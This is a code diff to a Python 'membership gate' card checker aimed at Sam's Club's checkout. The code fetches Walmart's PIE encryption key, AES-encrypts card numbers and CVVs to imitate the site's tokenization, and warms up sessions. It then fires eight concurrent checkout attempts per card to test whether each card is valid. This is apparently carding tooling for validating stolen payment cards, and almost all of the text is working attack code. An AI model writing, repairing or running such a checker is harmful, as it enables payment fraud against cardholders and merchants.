@@ -1,7 +1,7 @@
 """
 Sam's Club Plus Membership Gate API
-Professional checker with PIE getkey integration for proper tokenization.
-Uses Walmart PIE (Payment Identity Encryption) - fetches fresh key_id from getkey.js.
+Professional checker with PIE getkey + Voltage encryption for tokenization.
+Fetches key from getkey.js, encrypts PAN/CVV with AES, then tokenizes.
 """
 
 import httpx
@@ -15,6 +15,33 @@ from typing import Optional, Dict, Any, Tuple
 
 PIE_GETKEY_URL = "https://securedataweb.walmart.com/pie/v1/epay_pie/getkey.js"
 SAMS_BASE = "https://www.samsclub.com"
+
+try:
+    from Crypto.Cipher import AES
+    from Crypto.Util.Padding import pad
+    _HAS_CRYPTO = True
+except ImportError:
+    _HAS_CRYPTO = False
+
+
+def _voltage_encrypt(plaintext: str, key_hex: str) -> Optional[str]:
+    """
+    Voltage-style AES-128-ECB encryption for PAN/CVV.
+    key_hex: 32-char hex from PIE.K (16 bytes).
+    Returns hex-encoded ciphertext or None on failure.
+    """
+    if not _HAS_CRYPTO or not key_hex or not plaintext:
+        return None
+    try:
+        key = bytes.fromhex(key_hex)
+        if len(key) != 16:
+            return None
+        cipher = AES.new(key, AES.MODE_ECB)
+        padded = pad(plaintext.encode("utf-8"), AES.block_size)
+        enc = cipher.encrypt(padded)
+        return enc.hex()
+    except Exception:
+        return None
 
 
 def _parse_pie_getkey(js_text: str) -> Tuple[Optional[str], Optional[str]]:
@@ -155,6 +182,17 @@ class SamsClubChecker:
             "x-o-segment": "oaoh",
         }
 
+    @staticmethod
+    def _normalize_expiry(mes: str, ano: str) -> tuple:
+        """Normalize expiry to (MM, YYYY) - API requires 2-digit month, 4-digit year."""
+        mes = str(mes).strip().zfill(2)
+        ano = str(ano).strip()
+        if len(ano) == 2:
+            ano = f"20{ano}"
+        if not ano.isdigit() or int(ano) <= 0:
+            ano = "2029"  # fallback
+        return mes[:2], ano
+
     async def generate_ec_token(
         self,
         client: httpx.AsyncClient,
@@ -164,11 +202,19 @@ class SamsClubChecker:
         cvv: str,
         headers: Dict[str, str],
         key_id: str,
-    ) -> Optional[str]:
-        """Generate EC token using PIE key_id from getkey.js (fixes tokenization)."""
+        k_hex: Optional[str] = None,
+    ) -> Tuple[Optional[str], Dict[str, Any]]:
+        """Generate EC token. Returns (token, raw_response_dict) for debugging."""
         try:
+            exp_month, exp_year = self._normalize_expiry(mes, ano)
             payment_id = f"{self.generate_string(8)}-{self.generate_string(4)}-{self.generate_string(4)}-{self.generate_string(4)}-{self.generate_string(12)}"
             integrity = self.generate_hex_string(16)
+
+            encrypted_pan = _voltage_encrypt(cc, k_hex) if k_hex else cc
+            encrypted_cvv = _voltage_encrypt(cvv, k_hex) if k_hex else cvv
+
+            if not encrypted_pan or not encrypted_cvv:
+                return None, {"error": "Encryption failed (missing key or pycryptodome)"}
 
             json_data = {
                 "payment": {
@@ -181,13 +227,15 @@ class SamsClubChecker:
                             "identifier": "1",
                             "instrument": {
                                 "encryptionData": {
-                                    "encryptedCVV": cvv,
-                                    "encryptedPan": cc,
+                                    "encryptedCVV": encrypted_cvv,
+                                    "encryptedPan": encrypted_pan,
                                     "integrityCheck": integrity,
                                     "keyId": key_id,
                                     "phase": "0",
                                     "type": "VOLTAGE",
                                 },
+                                "expirationMonth": exp_month,
+                                "expirationYear": exp_year,
                             },
                             "customer": {"customerType": "JOIN"},
                         },
@@ -202,6 +250,11 @@ class SamsClubChecker:
                 timeout=30,
             )
 
+            raw_tok = {
+                "status_code": r.status_code,
+                "response_raw": r.text,
+                "response_json": r.json() if r.status_code in (200, 400, 500) else None,
+            }
             if r.status_code == 200:
                 data = r.json()
                 payment = data.get("payment", {})
@@ -209,10 +262,10 @@ class SamsClubChecker:
                 if transactions:
                     instruments = transactions[0].get("instrument", [])
                     if instruments:
-                        return instruments[0].get("value")
-            return None
-        except Exception:
-            return None
+                        return instruments[0].get("value"), raw_tok
+            return None, raw_tok
+        except Exception as e:
+            return None, {"error": str(e)}
 
     async def checkout(
         self,
@@ -239,7 +292,7 @@ class SamsClubChecker:
             "x-latency-trace": "1",
         })
 
-        exp_year = ano if len(ano) == 4 else f"20{ano}"
+        exp_month, exp_year = self._normalize_expiry(mes, ano)
         json_data = {
             "visitorId": self.base_cookies.get("vtc", "d6enzLw7T66uNsOdlc-IhA"),
             "acquisitionChannel": "Web_Join",
@@ -291,7 +344,7 @@ class SamsClubChecker:
                 "creditCard": {
                     "amountToBeCharged": 120.73,
                     "cardProduct": card_type,
-                    "expMonth": mes.zfill(2),
+                    "expMonth": exp_month,
                     "expYear": exp_year,
                     "cardNumber": cc[-4:],
                     "encryptionData": {"type": "VOLTAGE", "token": ec_token},
@@ -386,7 +439,11 @@ class SamsClubChecker:
         return f"Process {process_id} | ? UNKNOWN [{status_code}]"
 
     async def check_card(
-        self, card: str, process_id: int, key_id: Optional[str] = None
+        self,
+        card: str,
+        process_id: int,
+        key_id: Optional[str] = None,
+        k_hex: Optional[str] = None,
     ) -> tuple:
         """Single card check. Returns (display_str, raw_result_dict)."""
         try:
@@ -406,21 +463,29 @@ class SamsClubChecker:
             ) as client:
                 headers = self.get_base_headers(user_agent)
 
-                if not key_id:
-                    key_id, _ = await fetch_pie_keys(client)
+                if not key_id or not k_hex:
+                    fid, fk = await fetch_pie_keys(client)
+                    key_id = key_id or fid
+                    k_hex = k_hex or fk
                 if not key_id:
                     return (
                         f"Process {process_id} | ✗ PIE getkey failed (tokenization unavailable)",
                         {"process_id": process_id, "error": "PIE getkey failed"},
                     )
-
-                ec_token = await self.generate_ec_token(
-                    client, cc, mes, ano, cvv, headers, key_id
+                ec_token, tok_raw = await self.generate_ec_token(
+                    client, cc, mes, ano, cvv, headers, key_id, k_hex
                 )
                 if not ec_token:
                     return (
                         f"Process {process_id} | ✗ EC Token generation failed (tokenization error)",
-                        {"process_id": process_id, "error": "EC Token failed"},
+                        {
+                            "process_id": process_id,
+                            "error": "EC Token failed",
+                            "status_code": tok_raw.get("status_code"),
+                            "response_raw": tok_raw.get("response_raw", ""),
+                            "response_json": tok_raw.get("response_json"),
+                            "success": False,
+                        },
                     )
 
                 result = await self.checkout(
@@ -446,16 +511,34 @@ class SamsClubChecker:
                 {"process_id": process_id, "error": str(e)},
             )
 
+    async def _warmup_session(self, client: httpx.AsyncClient) -> None:
+        """Visit join page to establish session cookies (sams-pt, etc.)."""
+        try:
+            await client.get(
+                f"{self.BASE_URL}/join/plus",
+                params={"couponId": "Y8Q2A", "pageName": "aboutSams", "xid": "vanity:membership"},
+                headers={"user-agent": self.generate_user_agent(), "accept": "text/html,application/xhtml+xml"},
+                timeout=15,
+            )
+            await asyncio.sleep(0.5)
+        except Exception:
+            pass
+
     async def run_8_concurrent(self, card: str) -> tuple:
         """Run 8 concurrent checks. Returns (display_results, raw_responses)."""
-        async with httpx.AsyncClient(timeout=15, verify=False) as pre_client:
-            key_id, _ = await fetch_pie_keys(pre_client)
+        async with httpx.AsyncClient(timeout=20, follow_redirects=True, verify=False, cookies=self.base_cookies) as pre_client:
+            await self._warmup_session(pre_client)
+            key_id, k_hex = await fetch_pie_keys(pre_client)
         if not key_id:
             errs = [f"Process {i}: ✗ PIE getkey failed (tokenization unavailable)" for i in range(1, 9)]
             raws = [{"process_id": i, "error": "PIE getkey failed"} for i in range(1, 9)]
             return errs, raws
+        if _HAS_CRYPTO and not k_hex:
+            errs = [f"Process {i}: ✗ PIE.K missing (cannot encrypt)" for i in range(1, 9)]
+            raws = [{"process_id": i, "error": "PIE.K missing"} for i in range(1, 9)]
+            return errs, raws
 
-        tasks = [self.check_card(card, i + 1, key_id) for i in range(8)]
+        tasks = [self.check_card(card, i + 1, key_id, k_hex if _HAS_CRYPTO else None) for i in range(8)]
         gathered = await asyncio.gather(*tasks, return_exceptions=True)
 
         display_out = []
